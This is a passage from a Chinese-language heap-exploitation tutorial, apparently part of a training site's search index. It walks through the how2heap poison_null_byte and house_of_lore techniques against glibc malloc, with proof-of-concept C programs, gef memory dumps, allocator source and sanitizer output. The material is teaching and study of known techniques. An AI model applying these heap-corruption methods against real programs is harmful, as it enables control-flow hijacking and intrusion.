unsorted_bins[0]: fw=0x603100, bk=0x603100\n \u2192   Chunk(addr=0x603110, size=0x20, flags=PREV_INUSE)\n</code></pre> <p>\u8fd9\u91cc\u6709\u4e2a\u5f88\u6709\u8da3\u7684\u4e1c\u897f\uff0c\u5206\u914d\u5806\u5757\u540e\uff0c\u53d1\u751f\u53d8\u5316\u7684\u662f fake c.prev_size\uff0c\u800c\u4e0d\u662f c.prev_size\u3002\u6240\u4ee5 chunk c \u4f9d\u7136\u8ba4\u4e3a chunk b \u7684\u5730\u65b9\u6709\u4e00\u4e2a\u5927\u5c0f\u4e3a 0x110 \u7684 free chunk\u3002\u4f46\u5176\u5b9e\u8fd9\u7247\u5185\u5b58\u5df2\u7ecf\u88ab\u5206\u914d\u7ed9\u4e86 chunk b1\u3002</p> <p>\u63a5\u4e0b\u6765\u662f\u89c1\u8bc1\u5947\u8ff9\u7684\u65f6\u523b\uff0c\u6211\u4eec\u77e5\u9053\uff0c\u4e24\u4e2a\u76f8\u90bb\u7684 small chunk \u88ab\u91ca\u653e\u540e\u4f1a\u88ab\u5408\u5e76\u5728\u4e00\u8d77\u3002\u9996\u5148\u91ca\u653e chunk b1\uff0c\u4f2a\u9020\u51fa fake chunk b \u662f free chunk \u7684\u6837\u5b50\u3002\u7136\u540e\u91ca\u653e chunk c\uff0c\u8fd9\u65f6\u7a0b\u5e8f\u4f1a\u53d1\u73b0 chunk c \u7684\u524d\u4e00\u4e2a chunk \u662f\u4e00\u4e2a free chunk\uff0c\u7136\u540e\u5c31\u5c06\u5b83\u4eec\u5408\u5e76\u5728\u4e86\u4e00\u8d77\uff0c\u5e76\u4ece unsorted bin \u4e2d\u53d6\u51fa\u6765\u5408\u5e76\u8fdb\u4e86 top chunk\u3002\u53ef\u601c\u7684 chunk 2 \u4f4d\u4e8e chunk b1 \u548c chunk c \u4e4b\u95f4\uff0c\u88ab\u76f4\u63a5\u65e0\u89c6\u4e86\uff0c\u73b0\u5728 malloc \u8ba4\u4e3a\u8fd9\u6574\u5757\u533a\u57df\u90fd\u662f\u672a\u5206\u914d\u7684\uff0c\u65b0\u7684 top chunk \u6307\u9488\u5df2\u7ecf\u8bf4\u660e\u4e86\u4e00\u5207\u3002</p> <pre><code>gef\u27a4  x/42gx a-0x10\n0x603000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk a\n0x603010:    0x0000000000000000    0x0000000000000000\n0x603020:    0x0000000000000000    0x0000000000020fe1  &lt;-- top chunk\n0x603030:    0x0000000000603100    0x00007ffff7dd1b78\n0x603040:    0x4141414141414141    0x4141414141414141\n0x603050:    0x4141414141414141    0x4141414141414141\n0x603060:    0x4141414141414141    0x4141414141414141\n0x603070:    0x4141414141414141    0x4141414141414141\n0x603080:    0x4141414141414141    0x4141414141414141\n0x603090:    0x4141414141414141    0x4141414141414141\n0x6030a0:    0x4141414141414141    0x4141414141414141\n0x6030b0:    0x0000000000000090    0x0000000000000050  &lt;-- chunk b2  &lt;-- 'victim' chunk\n0x6030c0:    0x4141414141414141    0x4141414141414141\n0x6030d0:    0x4141414141414141    0x4141414141414141\n0x6030e0:    0x4141414141414141    0x4141414141414141\n0x6030f0:    0x4141414141414141    0x4141414141414141\n0x603100:    0x0000000000000000    0x0000000000000021  &lt;-- unsorted bin\n0x603110:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      &lt;-- fd, bk pointer\n0x603120:    0x0000000000000020    0x0000000000000000\n0x603130:    0x0000000000000110    0x0000000000000090\n0x603140:    0x0000000000000000    0x0000000000000000\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena 'main_arena' ]\n[+] unsorted_bins[0]: fw=0x603100, bk=0x603100\n \u2192   Chunk(addr=0x603110, size=0x20, flags=PREV_INUSE)\n</code></pre> <p>chunk \u5408\u5e76\u7684\u8fc7\u7a0b\u5982\u4e0b\uff0c\u9996\u5148\u8be5 chunk \u4e0e\u524d\u4e00\u4e2a chunk \u5408\u5e76\uff0c\u7136\u540e\u68c0\u67e5\u4e0b\u4e00\u4e2a chunk \u662f\u5426\u4e3a top chunk\uff0c\u5982\u679c\u4e0d\u662f\uff0c\u5c06\u5408\u5e76\u540e\u7684 chunk \u653e\u56de unsorted bin \u4e2d\uff0c\u5426\u5219\uff0c\u5408\u5e76\u8fdb top chunk\uff1a</p> <pre><code>    /* consolidate backward */\n    if (!prev_inuse(p)) {\n      prevsize = p-&gt;prev_size;\n      size += prevsize;\n      p = chunk_at_offset(p, -((long) prevsize));\n      unlink(av, p, bck, fwd);\n    }\n\n    if (nextchunk != av-&gt;top) {\n    /*\n  Place the chunk in unsorted chunk list. Chunks are\n  not placed into regular bins until after they have\n  been given one chance to be used in malloc.\n    */\n      [...]\n    }\n\n    /*\n      If the chunk borders the current high end of memory,\n      consolidate into top\n    */\n\n    else {\n      size += nextsize;\n      set_head(p, size | PREV_INUSE);\n      av-&gt;top = p;\n      check_chunk(av, p);\n    }\n</code></pre> <p>\u63a5\u4e0b\u6765\uff0c\u7533\u8bf7\u4e00\u5757\u5927\u7a7a\u95f4\uff0c\u5927\u5230\u53ef\u4ee5\u628a chunk b2 \u5305\u542b\u8fdb\u6765\uff0c\u8fd9\u6837 chunk b2 \u5c31\u5b8c\u5168\u88ab\u6211\u4eec\u63a7\u5236\u4e86\u3002</p> <pre><code>gef\u27a4  x/42gx a-0x10\n0x603000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk a\n0x603010:    0x0000000000000000    0x0000000000000000\n0x603020:    0x0000000000000000    0x0000000000000121  &lt;-- chunk d\n0x603030:    0x4242424242424242    0x4242424242424242\n0x603040:    0x4242424242424242    0x4242424242424242\n0x603050:    0x4242424242424242    0x4242424242424242\n0x603060:    0x4242424242424242    0x4242424242424242\n0x603070:    0x4242424242424242    0x4242424242424242\n0x603080:    0x4242424242424242    0x4242424242424242\n0x603090:    0x4242424242424242    0x4242424242424242\n0x6030a0:    0x4242424242424242    0x4242424242424242\n0x6030b0:    0x4242424242424242    0x4242424242424242  &lt;-- chunk b2  &lt;-- 'victim' chunk\n0x6030c0:    0x4242424242424242    0x4242424242424242\n0x6030d0:    0x4242424242424242    0x4242424242424242\n0x6030e0:    0x4141414141414141    0x4141414141414141\n0x6030f0:    0x4141414141414141    0x4141414141414141\n0x603100:    0x0000000000000000    0x0000000000000021  &lt;-- small bins\n0x603110:    0x00007ffff7dd1b88    0x00007ffff7dd1b88      &lt;-- fd, bk pointer\n0x603120:    0x0000000000000020    0x0000000000000000\n0x603130:    0x0000000000000110    0x0000000000000090\n0x603140:    0x0000000000000000    0x0000000000020ec1  &lt;-- top chunk\ngef\u27a4  heap bins small\n[ Small Bins for arena 'main_arena' ]\n[+] small_bins[1]: fw=0x603100, bk=0x603100\n \u2192   Chunk(addr=0x603110, size=0x20, flags=PREV_INUSE)\n</code></pre> <p>\u8fd8\u6709\u4e2a\u4e8b\u60c5\u503c\u5f97\u6ce8\u610f\uff0c\u5728\u5206\u914d chunk d \u65f6\uff0c\u7531\u4e8e\u5728 unsorted bin \u4e2d\u6ca1\u6709\u627e\u5230\u9002\u5408\u7684 chunk\uff0cmalloc \u5c31\u5c06 unsorted bin \u4e2d\u7684 chunk \u90fd\u6574\u7406\u56de\u5404\u81ea\u7684 bins \u4e2d\u4e86\uff0c\u8fd9\u91cc\u5c31\u662f small bins\u3002</p> <p>\u6700\u540e\uff0c\u7ee7\u7eed\u770b libc-2.26 \u4e0a\u7684\u60c5\u51b5\uff0c\u8fd8\u662f\u4e00\u6837\u7684\uff0c\u5904\u7406\u597d tchache \u5c31\u53ef\u4ee5\u4e86\uff0c\u628a\u4e24\u79cd\u5927\u5c0f\u7684 tcache bin \u90fd\u5360\u6ee1\u3002</p> <p>heap-buffer-overflow\uff0c\u4f46\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\uff0c\u52a0\u4e86\u5185\u5b58\u68c0\u6d4b\u53c2\u6570\u540e\uff0creal size \u53ea\u80fd\u662f\u6b63\u5e38\u7684 0x10 \u4e86\u3002</p> <pre><code>$ gcc -fsanitize=address -g poison_null_byte.c\n$ ./a.out\nWe allocate 0x10 bytes for 'a': 0x60200000eff0\n'real' size of 'a': 0x10\nb: 0x611000009f00\nc: 0x60c00000bf80\n=================================================================\n==2369==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x611000009ef8 at pc 0x000000400be0 bp 0x7ffe7826e9a0 sp 0x7ffe7826e990\nREAD of size 8 at 0x611000009ef8 thread T0\n    #0 0x400bdf in main /home/firmy/how2heap/poison_null_byte.c:22\n    #1 0x7f47d8fe382f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)\n    #2 0x400978 in _start (/home/firmy/how2heap/a.out+0x400978)\n\n0x611000009ef8 is located 8 bytes to the left of 256-byte region [0x611000009f00,0x61100000a000)\nallocated by thread T0 here:\n    #0 0x7f47d9425602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602)\n    #1 0x400af1 in main /home/firmy/how2heap/poison_null_byte.c:15\n    #2 0x7f47d8fe382f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#house_of_lore","title":"house_of_lore","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdint.h&gt;\n\nvoid jackpot(){ puts(\"Nice jump d00d\"); exit(0); }\n\nint main() {\n    intptr_t *victim = malloc(0x80);\n    memset(victim, 'A', 0x80);\n    void *p5 = malloc(0x10);\n    memset(p5, 'A', 0x10);\n    intptr_t *victim_chunk = victim - 2;\n    fprintf(stderr, \"Allocated the victim (small) chunk: %p\\n\", victim);\n\n    intptr_t* stack_buffer_1[4] = {0};\n    intptr_t* stack_buffer_2[3] = {0};\n    stack_buffer_1[0] = 0;\n    stack_buffer_1[2] = victim_chunk;\n    stack_buffer_1[3] = (intptr_t*)stack_buffer_2;\n    stack_buffer_2[2] = (intptr_t*)stack_buffer_1;\n    fprintf(stderr, \"stack_buffer_1: %p\\n\", (void*)stack_buffer_1);\n    fprintf(stderr, \"stack_buffer_2: %p\\n\\n\", (void*)stack_buffer_2);\n\n    free((void*)victim);\n    fprintf(stderr, \"Freeing the victim chunk %p, it will be inserted in the unsorted bin\\n\", victim);\n    fprintf(stderr, \"victim-&gt;fd: %p\\n\", (void *)victim[0]);\n    fprintf(stderr, \"victim-&gt;bk: %p\\n\\n\", (void *)victim[1]);\n\n    void *p2 = malloc(0x100);\n    fprintf(stderr, \"Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: %p\\n\", p2);\n    fprintf(stderr, \"The victim chunk %p will be inserted in front of the SmallBin\\n\", victim);\n    fprintf(stderr, \"victim-&gt;fd: %p\\n\", (void *)victim[0]);\n    fprintf(stderr, \"victim-&gt;bk: %p\\n\\n\", (void *)victim[1]);\n\n    victim[1] = (intptr_t)stack_buffer_1;\n    fprintf(stderr, \"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\\n\");\n\n    void *p3 = malloc(0x40);\n    char *p4 = malloc(0x80);\n    memset(p4, 'A', 0x10);\n    fprintf(stderr, \"This last malloc should return a chunk at the position injected in bin-&gt;bk: %p\\n\", p4);\n    fprintf(stderr, \"The fd pointer of stack_buffer_2 has changed: %p\\n\\n\", stack_buffer_2[2]);\n\n    intptr_t sc = (intptr_t)jackpot;\n    memcpy((p4+40), &amp;sc, 8);\n}\n$ gcc -g house_of_lore.c\n$ ./a.out\nAllocated the victim (small) chunk: 0x1b2e010\nstack_buffer_1: 0x7ffe5c570350\nstack_buffer_2: 0x7ffe5c570330\n\nFreeing the victim chunk 0x1b2e010, it will be inserted in the unsorted bin\nvictim-&gt;fd: 0x7f239d4c9b78\nvictim-&gt;bk: 0x7f239d4c9b78\n\nMalloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x1b2e0c0\nThe victim chunk 0x1b2e010 will be inserted in front of the SmallBin\nvictim-&gt;fd: 0x7f239d4c9bf8\nvictim-&gt;bk: 0x7f239d4c9bf8\n\nNow emulating a vulnerability that can overwrite the victim-&gt;bk pointer\nThis last malloc should return a chunk at the position injected in bin-&gt;bk: 0x7ffe5c570360\nThe fd pointer of stack_buffer_2 has changed: 0x7f239d4c9bf8\n\nNice jump d00d\n</code></pre> <p>\u5728\u524d\u9762\u7684\u6280\u672f\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u600e\u6837\u53bb\u4f2a\u9020\u4e00\u4e2a fake chunk\uff0c\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u8981\u5c1d\u8bd5\u4f2a\u9020\u4e00\u6761 small bins \u94fe\u3002</p> <p>\u9996\u5148\u521b\u5efa\u4e24\u4e2a chunk\uff0c\u7b2c\u4e00\u4e2a\u662f\u6211\u4eec\u7684 victim chunk\uff0c\u8bf7\u786e\u4fdd\u5b83\u662f\u4e00\u4e2a small chunk\uff0c\u7b2c\u4e8c\u4e2a\u968f\u610f\uff0c\u53ea\u662f\u4e3a\u4e86\u786e\u4fdd\u5728 free \u65f6 victim chunk \u4e0d\u4f1a\u88ab\u5408\u5e76\u8fdb top chunk \u91cc\u3002\u7136\u540e\uff0c\u5728\u6808\u4e0a\u4f2a\u9020\u4e24\u4e2a fake chunk\uff0c\u8ba9 fake chunk 1 \u7684 fd \u6307\u5411 victim chunk\uff0cbk \u6307\u5411 fake chunk 2\uff1bfake chunk 2 \u7684 fd \u6307\u5411 fake chunk 1\uff0c\u8fd9\u6837\u4e00\u4e2a small bin \u94fe\u5c31\u5dee\u4e0d\u591a\u4e86\uff1a</p> <pre><code>gef\u27a4  x/26gx victim-2\n0x603000:    0x0000000000000000    0x0000000000000091  &lt;-- victim chunk\n0x603010:    0x4141414141414141    0x4141414141414141\n0x603020:    0x4141414141414141    0x4141414141414141\n0x603030:    0x4141414141414141    0x4141414141414141\n0x603040:    0x4141414141414141    0x4141414141414141\n0x603050:    0x4141414141414141    0x4141414141414141\n0x603060:    0x4141414141414141    0x4141414141414141\n0x603070:    0x4141414141414141    0x4141414141414141\n0x603080:    0x4141414141414141    0x4141414141414141\n0x603090:    0x0000000000000000    0x0000000000000021  &lt;-- chunk p5\n0x6030a0:    0x4141414141414141    0x4141414141414141\n0x6030b0:    0x0000000000000000    0x0000000000020f51  &lt;-- top chunk\n0x6030c0:    0x0000000000000000    0x0000000000000000\ngef\u27a4  x/10gx &amp;stack_buffer_2\n0x7fffffffdc30:    0x0000000000000000    0x0000000000000000  &lt;-- fake chunk 2\n0x7fffffffdc40:    0x00007fffffffdc50    0x0000000000400aed      &lt;-- fd-&gt;fake chunk 1\n0x7fffffffdc50:    0x0000000000000000    0x0000000000000000  &lt;-- fake chunk 1\n0x7fffffffdc60:    0x0000000000603000    0x00007fffffffdc30      &lt;-- fd-&gt;victim chunk, bk-&gt;fake chunk 2\n0x7fffffffdc70:    0x00007fffffffdd60    0x7c008088c400bc00\n</code></pre> <p>molloc \u4e2d\u5bf9\u4e8e small bin \u94fe\u8868\u7684\u68c0\u67e5\u662f\u8fd9\u6837\u7684\uff1a</p> <pre><code>          [...]\n\n          else\n            {\n              bck = victim-&gt;bk;\n    if (__glibc_unlikely (bck-&gt;fd != victim))\n                {\n                  errstr = \"malloc(): smallbin double linked list corrupted\";\n                  goto errout;\n                }\n              set_inuse_bit_at_offset (victim, nb);\n              bin-&gt;bk = bck;\n              bck-&gt;fd = bin;\n\n              [...]\n</code></pre> <p>\u5373\u68c0\u67e5 bin \u4e2d\u7b2c\u4e8c\u5757\u7684 bk \u6307\u9488\u662f\u5426\u6307\u5411\u7b2c\u4e00\u5757\uff0c\u6765\u53d1\u73b0\u5bf9 small bins \u7684\u7834\u574f\u3002\u4e3a\u4e86\u7ed5\u8fc7\u8fd9\u4e2a\u68c0\u67e5\uff0c\u6240\u4ee5\u624d\u9700\u8981\u540c\u65f6\u4f2a\u9020 bin \u4e2d\u7684\u524d 2 \u4e2a chunk\u3002</p> <p>\u63a5\u4e0b\u6765\u91ca\u653e\u6389 victim chunk\uff0c\u5b83\u4f1a\u88ab\u653e\u5230 unsoted bin \u4e2d\uff0c\u4e14 fd/bk \u5747\u6307\u5411 unsorted bin \u7684\u5934\u90e8\uff1a</p> <pre><code>gef\u27a4  x/26gx victim-2\n0x603000:    0x0000000000000000    0x0000000000000091  &lt;-- victim chunk [be freed]\n0x603010:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      &lt;-- fd, bk pointer\n0x603020:    0x4141414141414141    0x4141414141414141\n0x603030:    0x4141414141414141    0x4141414141414141\n0x603040:    0x4141414141414141    0x4141414141414141\n0x603050:    0x4141414141414141    0x4141414141414141\n0x603060:    0x4141414141414141    0x4141414141414141\n0x603070:    0x4141414141414141    0x4141414141414141\n0x603080:    0x4141414141414141    0x4141414141414141\n0x603090:    0x0000000000000090    0x0000000000000020  &lt;-- chunk p5\n0x6030a0:    0x4141414141414141    0x4141414141414141\n0x6030b0:    0x0000000000000000    0x0000000000020f51  &lt;-- top chunk\n0x6030c0:    0x0000000000000000    0x0000000000000000\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena 'main_arena' ]\n[+] unsorted_bins[0]: fw=0x603000, bk=0x603000\n \u2192   Chunk(addr=0x603010, size=0x90, flags=PREV_INUSE)\n</code></pre> <p>\u8fd9\u65f6\uff0c\u7533\u8bf7\u4e00\u5757\u5927\u7684 chunk\uff0c\u53ea\u9700\u8981\u5927\u5230\u8ba9 malloc \u5728 unsorted bin \u4e2d\u627e\u4e0d\u5230\u5408\u9002\u7684\u5c31\u53ef\u4ee5\u4e86\u3002\u8fd9\u6837\u539f\u672c\u5728 unsorted bin \u4e2d\u7684 chunk\uff0c\u4f1a\u88ab\u6574\u7406\u56de\u5404\u81ea\u7684\u6240\u5c5e\u7684 bins \u4e2d\uff0c\u8fd9\u91cc\u5c31\u662f small bins\uff1a</p> <pre><code>gef\u27a4  heap bins small\n[ Small Bins for arena 'main_arena' ]\n[+] small_bins[8]: fw=0x603000, bk=0x603000\n \u2192   Chunk(addr=0x603010, size=0x90, flags=PREV_INUSE)\n</code></pre> <p>\u63a5\u4e0b\u6765\u662f\u6700\u5173\u952e\u7684\u4e00\u6b65\uff0c\u5047\u8bbe\u5b58\u5728\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u4fee\u6539 victim chunk \u7684 bk \u6307\u9488\u3002\u90a3\u4e48\u5c31\u4fee\u6539 bk \u8ba9\u5b83\u6307\u5411\u6211\u4eec\u5728\u6808\u4e0a\u5e03\u7f6e\u7684 fake small bin\uff1a</p> <pre><code>gef\u27a4  x/26gx victim-2\n0x603000:    0x0000000000000000    0x0000000000000091  &lt;-- victim chunk [be freed]\n0x603010:    0x00007ffff7dd1bf8    0x00007fffffffdc50      &lt;-- bk-&gt;fake chunk 1\n0x603020:    0x4141414141414141    0x4141414141414141\n0x603030:    0x4141414141414141    0x4141414141414141\n0x603040:    0x4141414141414141    0x4141414141414141\n0x603050:    0x4141414141414141    0x4141414141414141\n0x603060:    0x4141414141414141    0x4141414141414141\n0x603070:    0x4141414141414141    0x4141414141414141\n0x603080:    0x4141414141414141    0x4141414141414141\n0x603090:    0x0000000000000090    0x0000000000000020  &lt;-- chunk p5\n0x6030a0:    0x4141414141414141    0x4141414141414141\n0x6030b0:    0x0000000000000000    0x0000000000000111  &lt;-- chunk p2\n0x6030c0:    0x0000000000000000    0x0000000000000000\ngef\u27a4  x/10gx &amp;stack_buffer_2\n0x7fffffffdc30:    0x0000000000000000    0x0000000000000000  &lt;-- fake chunk 2\n0x7fffffffdc40:    0x00007fffffffdc50    0x0000000000400aed      &lt;-- fd-&gt;fake chunk 1\n0x7fffffffdc50:    0x0000000000000000    0x0000000000000000  &lt;-- fake chunk 1\n0x7fffffffdc60:    0x0000000000603000    0x00007fffffffdc30     &lt;-- fd-&gt;victim chunk, bk-&gt;fake chunk 2\n0x7fffffffdc70:    0x00007fffffffdd60    0x7c008088c400bc00\n</code></pre> <p>\u6211\u4eec\u77e5\u9053 small bins \u662f\u5148\u8fdb\u540e\u51fa\u7684\uff0c\u8282\u70b9\u7684\u589e\u52a0\u53d1\u751f\u5728\u94fe\u8868\u5934\u90e8\uff0c\u800c\u5220\u9664\u53d1\u751f\u5728\u5c3e\u90e8\u3002\u8fd9\u65f6\u6574\u6761\u94fe\u662f\u8fd9\u6837\u7684\uff1a</p> <pre><code>HEAD(undefined) &lt;-&gt; fake chunk 2 &lt;-&gt; fake chunk 1 &lt;-&gt; victim chunk &lt;-&gt; TAIL\n\nfd: -&gt;\nbk: &lt;-\n</code></pre> <p>fake chunk 2 \u7684 bk \u6307\u5411\u4e86\u4e00\u4e2a\u672a\u5b9a\u4e49\u7684\u5730\u5740\uff0c\u5982\u679c\u80fd\u901a\u8fc7\u5185\u5b58\u6cc4\u9732\u7b49\u624b\u6bb5\uff0c\u62ff\u5230 HEAD \u7684\u5730\u5740\u5e76\u586b\u8fdb\u53bb\uff0c\u6574\u6761\u94fe\u5c31\u95ed\u5408\u4e86\u3002\u5f53\u7136\u8fd9\u91cc\u5b8c\u5168\u6ca1\u6709\u5fc5\u8981\u8fd9\u4e48\u505a\u3002</p> <p>\u63a5\u4e0b\u6765\u7684\u7b2c\u4e00\u4e2a malloc\uff0c\u4f1a\u8fd4\u56de victim chunk \u7684\u5730\u5740\uff0c\u5982\u679c malloc \u7684\u5927\u5c0f\u6b63\u597d\u7b49\u4e8e victim chunk \u7684\u5927\u5c0f\uff0c\u90a3\u4e48\u60c5\u51b5\u4f1a\u7b80\u5355\u4e00\u70b9\u3002\u4f46\u662f\u8fd9\u91cc\u6211\u4eec\u4e0d\u8fd9\u6837\u505a\uff0cmalloc \u4e00\u4e2a\u5c0f\u4e00\u70b9\u7684\u5730\u5740\uff0c\u53ef\u4ee5\u770b\u5230\uff0cmalloc \u4ece small bin \u91cc\u53d6\u51fa\u4e86\u672b\u5c3e\u7684 victim chunk\uff0c\u5207\u4e86\u4e00\u5757\u8fd4\u56de\u7ed9 chunk p3\uff0c\u7136\u540e\u628a\u5269\u4e0b\u7684\u90e8\u5206\u653e\u56de\u5230\u4e86 unsorted bin\u3002\u540c\u65f6 small bin \u53d8\u6210\u4e86\u8fd9\u6837\uff1a</p> <pre><code>HEAD(undefined) &lt;-&gt; fake chunk 2 &lt;-&gt; fake chunk 1 &lt;-&gt; TAIL\ngef\u27a4  x/26gx victim-2\n0x603000:    0x0000000000000000    0x0000000000000051  &lt;-- chunk p3\n0x603010:    0x00007ffff7dd1bf8    0x00007fffffffdc50\n0x603020:    0x4141414141414141    0x4141414141414141\n0x603030:    0x4141414141414141    0x4141414141414141\n0x603040:    0x4141414141414141    0x4141414141414141\n0x603050:    0x4141414141414141    0x0000000000000041  &lt;-- unsorted bin\n0x603060:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      &lt;-- fd, bk pointer\n0x603070:    0x4141414141414141    0x4141414141414141\n0x603080:    0x4141414141414141    0x4141414141414141\n0x603090:    0x0000000000000040    0x0000000000000020  &lt;-- chunk p5\n0x6030a0:    0x4141414141414141    0x4141414141414141\n0x6030b0:    0x0000000000000000    0x0000000000000111  &lt;-- chunk p2\n0x6030c0:    0x0000000000000000    0x0000000000000000\ngef\u27a4  x/10gx &amp;stack_buffer_2\n0x7fffffffdc30:    0x0000000000000000    0x0000000000000000  &lt;-- fake chunk 2\n0x7fffffffdc40:    0x00007fffffffdc50    0x0000000000400aed      &lt;-- fd-&gt;fake chunk 1\n0x7fffffffdc50:    0x0000000000000000    0x0000000000000000  &lt;-- fake chunk 1\n0x7fffffffdc60:    0x00007ffff7dd1bf8    0x00007fffffffdc30      &lt;-- fd-&gt;TAIL, bk-&gt;fake chunk 2\n0x7fffffffdc70:    0x00007fffffffdd60    0x7c008088c400bc00\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena 'main_arena' ]\n[+] unsorted_bins[0]: fw=0x603050, bk=0x603050\n \u2192   Chunk(addr=0x603060, size=0x40, flags=PREV_INUSE)\n</code></pre> <p>\u6700\u540e\uff0c\u518d\u6b21 malloc \u5c06\u8fd4\u56de fake chunk 1 \u7684\u5730\u5740\uff0c\u5730\u5740\u5728\u6808\u4e0a\u4e14\u6211\u4eec\u80fd\u591f\u63a7\u5236\u3002\u540c\u65f6 small bin \u53d8\u6210\u8fd9\u6837\uff1a</p> <pre><code>HEAD(undefined) &lt;-&gt; fake chunk 2 &lt;-&gt; TAIL\ngef\u27a4  x/10gx &amp;stack_buffer_2\n0x7fffffffdc30:    0x0000000000000000    0x0000000000000000  &lt;-- fake chunk 2\n0x7fffffffdc40:    0x00007ffff7dd1bf8    0x0000000000400aed      &lt;-- fd-&gt;TAIL\n0x7fffffffdc50:    0x0000000000000000    0x0000000000000000  &lt;-- chunk 4\n0x7fffffffdc60:    0x4141414141414141    0x4141414141414141\n0x7fffffffdc70:    0x00007fffffffdd60    0x7c008088c400bc00\n</code></pre> <p>\u4e8e\u662f\u6211\u4eec\u5c31\u6210\u529f\u5730\u9a97\u8fc7\u4e86 malloc \u5728\u6808\u4e0a\u5206\u914d\u4e86\u4e00\u4e2a chunk\u3002</p> <p>\u6700\u540e\u518d\u60f3\u4e00\u4e0b\uff0c\u5176\u5b9e\u6700\u521d\u7684 victim chunk \u4f7f\u7528 fast chunk \u4e5f\u662f\u53ef\u4ee5\u7684\uff0c\u5176\u91ca\u653e\u540e\u867d\u7136\u662f\u88ab\u52a0\u5165\u5230 fast bins \u4e2d\uff0c\u800c\u4e0d\u662f unsorted bin\uff0c\u4f46 malloc \u4e4b\u540e\uff0c\u4e5f\u4f1a\u88ab\u6574\u7406\u5230 small bins \u91cc\u3002\u81ea\u884c\u5c1d\u8bd5\u5427\u3002</p> <p>heap-use-after-free\uff0c\u6240\u4ee5\u4e0a\u9762\u6211\u4eec\u7528\u4e8e\u4fee\u6539 bk \u6307\u9488\u7684\u6f0f\u6d1e\uff0c\u5e94\u8be5\u5c31\u662f\u4e00\u4e2a UAF \u5427\uff0c\u5f53\u7136\u6ea2\u51fa\u4e5f\u662f\u53ef\u4ee5\u7684\uff1a</p> <pre><code>$ gcc -fsanitize=address -g house_of_lore.c\n$ ./a.out\nAllocated the victim (small) chunk: 0x60c00000bf80\nstack_buffer_1: 0x7ffd1fbc5cd0\nstack_buffer_2: 0x7ffd1fbc5c90\n\nFreeing the victim chunk 0x60c00000bf80, it will be inserted in the unsorted bin\n=================================================================\n==6034==ERROR: AddressSanitizer: heap-use-after-free on address 0x60c00000bf80 at pc 0x000000400eec bp 0x7ffd1fbc5bf0 sp 0x7ffd1fbc5be0\nREAD of size 8 at 0x60c00000bf80 thread T0\n    #0 0x400eeb in main /home/firmy/how2heap/house_of_lore.c:27\n    #1 0x7febee33c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)\n    #2 0x400b38 in _start (/home/firmy/how2heap/a.out+0x400b38)\n</code></pre> <p>\u6700\u540e\u518d\u7ed9\u4e00\u4e2a libc-2.27 \u7248\u672c\u7684\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdint.h&gt;\n\nvoid jackpot(){ puts(\"Nice jump d00d\"); exit(0); }\n\nint main() {\n    intptr_t *victim = malloc(0x80);\n\n    // fill the tcache\n    int *a[10];\n    int i;\n    for (i = 0; i &lt; 7; i++) {\n        a[i] = malloc(0x80);\n    }\n    for (i = 0; i &lt; 7; i++) {\n        free(a[i]);\n    }\n\n    memset(victim, 'A', 0x80);\n    void *p5 = malloc(0x10);\n    memset(p5, 'A', 0x10);\n    intptr_t *victim_chunk = victim - 2;\n    fprintf(stderr, \"Allocated the victim (small) chunk: %p\\n\", victim);\n\n    intptr_t* stack_buffer_1[4] = {0};\n    intptr_t* stack_buffer_2[6] = {0};\n    stack_buffer_1[0] = 0;\n    stack_buffer_1[2] = victim_chunk;\n    stack_buffer_1[3] = (intptr_t*)stack_buffer_2;\n    stack_buffer_2[2] = (intptr_t*)stack_buffer_1;\n    stack_buffer_2[3] = (intptr_t*)stack_buffer_1;    // 3675 bck-&gt;fd = bin;\n\n    fprintf(stderr, \"stack_buffer_1: %p\\n\", (void*)stack_buffer_1);\n    fprintf(stderr, \"stack_buffer_2: %p\\n\\n\", (void*)stack_buffer_2);\n\n    free((void*)victim);\n    fprintf(stderr, \"Freeing the victim chunk %p, it will be inserted in the unsorted bin\\n\", victim);\n    fprintf(stderr, \"victim-&gt;fd: %p\\n\", (void *)victim[0]);\n    fprintf(stderr, \"victim-&gt;bk: %p\\n\\n\", (void *)victim[1]);\n\n    void *p2 = malloc(0x100);\n    fprintf(stderr, \"Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: %p\\n\", p2);\n    fprintf(stderr, \"The victim chunk %p will be inserted in front of the SmallBin\\n\", victim);\n    fprintf(stderr, \"victim-&gt;fd: %p\\n\", (void *)victim[0]);\n    fprintf(stderr, \"victim-&gt;bk: %p\\n\\n\", (void *)victim[1]);\n\n    victim[1] = (intptr_t)stack_buffer_1;\n    fprintf(stderr, \"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\\n\");\n\n    void *p3 = malloc(0x40);\n\n    // empty the tcache\n    for (i = 0; i &lt; 7; i++) {\n        a[i] = malloc(0x80);\n    }\n\n    char *p4 = malloc(0x80);\n    memset(p4, 'A', 0x10);\n    fprintf(stderr, \"This last malloc should return a chunk at the position injected in bin-&gt;bk: %p\\n\", p4);\n    fprintf(stderr, \"The fd pointer of stack_buffer_2 has changed: %p\\n\\n\", stack_buffer_2[2]);\n\n    